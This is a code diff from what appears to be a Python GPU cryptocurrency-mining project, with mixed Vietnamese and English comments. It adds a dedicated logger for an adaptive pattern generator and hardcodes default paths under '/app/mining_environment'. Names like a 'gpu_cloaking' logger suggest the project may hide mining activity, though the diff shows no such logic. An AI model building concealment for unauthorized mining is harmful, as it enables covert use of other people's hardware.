@@ -23,12 +23,12 @@ from pathlib import Path
 # Handle both package and standalone imports
 try:
     from .utils import MiningProcess, StrategyType
-    from .module_loggers import get_gpu_cloaking_logger, get_gpu_optimization_logger
+    from .module_loggers import get_gpu_cloaking_logger, get_gpu_optimization_logger, get_adaptive_pattern_generator_logger
     from .error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error
 except ImportError:
     # Fallback for standalone execution
     from utils import MiningProcess, StrategyType
-    from module_loggers import get_gpu_cloaking_logger, get_gpu_optimization_logger
+    from module_loggers import get_gpu_cloaking_logger, get_gpu_optimization_logger, get_adaptive_pattern_generator_logger
     from error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error
 
 # ✅ **STANDARDIZED** (chuẩn hóa): Lấy **unified logger instance** (thực thể logger thống nhất – đối tượng ghi nhật ký đồng bộ) (khớp **hierarchy** – phân cấp)
@@ -122,8 +122,7 @@ class MetricsCollectionHub:
         self.single_file_export: bool = (env_flag != '0')  # default True when env unset
         self.fixed_export_path: Optional[Path] = None
         if self.single_file_export:
-            default_metrics_path = Path(__file__).resolve().parent.parent / 'logs/metrics.json'
-            fixed_path_str = os.getenv('METRICS_EXPORT_PATH', str(default_metrics_path))
+            fixed_path_str = os.getenv('METRICS_EXPORT_PATH', '/app/mining_environment/logs/metrics.json')
             try:
                 self.fixed_export_path = Path(fixed_path_str)
                 self.fixed_export_path.parent.mkdir(parents=True, exist_ok=True)
@@ -868,8 +867,8 @@ class AdaptivePatternGenerator:
         Initialize với **optimization profile** (hồ sơ tối ưu – cấu hình tối ưu hóa)
         :param profile: "light", "medium", hoặc "heavy"
         """
-        # Route AdaptivePatternGenerator logs to GPU Optimization logger for centralized analysis
-        self.logger = get_gpu_optimization_logger()
+        # Route AdaptivePatternGenerator logs to dedicated file for centralized analysis
+        self.logger = get_adaptive_pattern_generator_logger()
         self.profile_name = profile
         self.config = self._load_config()
         self.profile = self.config['profiles'].get(profile, self.config['profiles']['medium'])
@@ -957,8 +956,7 @@ class AdaptivePatternGenerator:
         """
         Load **configuration file** (file cấu hình – tệp thiết lập)
         """
-        default_cfg = Path(__file__).resolve().parent.parent / 'config/gpu_optimization_config.json'
-        config_path = os.getenv('GPU_OPT_CONFIG', str(default_cfg))
+        config_path = os.getenv('GPU_OPT_CONFIG', '/app/mining_environment/config/gpu_optimization_config.json')
         try:
             if os.path.exists(config_path):
                 with open(config_path, 'r') as f:
